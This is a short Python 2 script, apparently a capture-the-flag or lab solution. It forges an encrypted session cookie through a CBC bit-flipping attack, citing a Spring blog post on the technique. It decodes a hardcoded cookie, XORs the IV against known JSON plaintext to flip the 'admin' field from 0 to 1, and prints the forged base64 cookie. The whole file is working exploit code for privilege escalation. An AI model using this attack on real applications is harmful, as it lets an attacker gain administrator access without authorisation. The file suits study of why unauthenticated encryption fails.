import requests
import base64
import json


#based on https://spring.io/blog/2014/01/20/exploiting-encrypted-cookies-for-fun-and-profit

cookie = "QIUwW0LRPsRJ+EZPXUSsYpFNi4fEWNZygdwfyus45Vi+t+oEArEcX00Gv+fhUZ6i1q8uxBIZwK9xSYqCaBTFoQ=="

e = bytearray(base64.b64decode(cookie))

iv = e[:16]
cipher = e[16:]

cipher_blocks = [cipher[i:i+16] for i in range(0, len(cipher), 16)]

print map(len, cipher_blocks)

wanted = {}
wanted['password'] = 'a'
wanted['username'] = 'a'
wanted['admin'] = 0
wanted_data = json.dumps(wanted, sort_keys=True)

d_plain = [a ^ b for (a,b) in zip(bytearray(wanted_data), iv)]

print 'd_plain:', d_plain

wanted['admin'] = 1
wanted_data = json.dumps(wanted, sort_keys=True)

new_iv = [a ^ b for (a,b) in zip(d_plain, bytearray(wanted_data))]

for i in cipher:
    new_iv.append(i)

print new_iv
new_iv = map(chr, new_iv)

print base64.b64encode("".join(new_iv))
